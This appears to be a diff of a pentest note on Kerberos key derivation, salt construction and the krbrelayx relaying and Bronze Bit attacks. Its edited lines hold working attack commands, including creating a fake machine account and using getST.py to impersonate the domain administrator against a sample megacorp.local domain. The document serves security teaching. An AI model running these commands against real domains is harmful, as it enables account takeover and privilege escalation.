@@ -18,7 +18,7 @@ In order to successfully decrypt service TGS we must calculate its Kerberos key 
 * For a user/service account the salt is built as uppercase Kerberos realm name + case sensitive username.
 * For a computer account the salt is built as uppercase Kerberos realm name + the word `host` + lowercase FQDN hostname.
 
-Let's say the domain name (Kerberos realm) is `megacorp.local`, then for user `Bob_Adm` the salt will be `MEGACORP.LOCALBob_Adm`, and for computer `SRV01` the salt will be `MEGACORP.LOCALhostsrv01.megacorp.local`.
+Let's say the domain name (Kerberos realm) is `megacorp.local`, then for user `Bob_Adm` the salt will be `MEGACORP.LOCALBob_Adm`, and for computer `SRV01$` the salt will be `MEGACORP.LOCALhostsrv01.megacorp.local`.
 
 Based on the "Relaying" Kerberos attack [toolkit](https://github.com/dirkjanm/krbrelayx) (by [@dirkjanm](https://twitter.com/_dirkjan)) the keys can be calculated with the following Python code using [impacket](https://github.com/SecureAuthCorp/impacket):
 
@@ -71,7 +71,7 @@ When performing the ["Relaying" Kerberos attack](https://dirkjanm.io/krbrelayx-u
 
 ```console
 # Calculate the AES key automatically
-~$ krbrelayx.py --krbpass 'Passw0rd!' --krbsalt 'MEGACORP.LOCALhostsrv01.megacorp.local'
+~$ krbrelayx.py --krbsalt MEGACORP.LOCALhostsrv01.megacorp.local --krbhexpass 16ef05840eedc3af56b2cd75bba16ace855271729f0265d6638bc0a5097b095e8abd316f9f89da445fa16907f04cde46d847291060185437a67d10547cdebbea138846fe019a63c3e91cf1ed416f5b6f05cdcc03b772c5d68a6d71c05130c7e3df1c4760fe72b82fb3441a1ca43d5873028b3bb671a51f4ceada3bf063c8742bd24587c66c1ad3e0a1e34b566b0917209d54345bc0ccdb81a0cfecedad38fc2fb98990f3b45f70dd18e64928fbb9c41c5f284b5748669cf3369146626cf0aafaf43f24d0ac927ff499e0f5dc06c1be1d4d8ff5006c581b0d2e0b188156c680fec864d5215b2d17864096b4d0a59e705d
 # Pre-calculate the AES key and pass it as an argument
 ~$ krbrelayx.py -aesKey 4e70fdfa30728cb202aa6b169627078546a3a30ddf0e655f493ae372dd30fa57
 ```
@@ -118,7 +118,7 @@ On the other hand, when performing the [Bronze Bit attack](https://www.netspi.co
 
 ```console
 PS > New-MachineAccount -MachineAccount fakemachine -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
-~$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' megacorp.local/fakemachine -hashes :fc525c9683e8fe067095ba2ddc971889 -aesKey 211e8e3134ed797b0a2bf6c36d1a966b3bed2b24e4aaa9eceed23d0abf659e98 -force-forwardable
+~$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' megacorp.local/fakemachine -hashes :fc525c9683e8fe067095ba2ddc971889 -aesKey de933a0f9cabde83ba6ab195af8ecb8af982b50992606caab74568cf47ca4cd3 -force-forwardable
 ```
 
 ```python
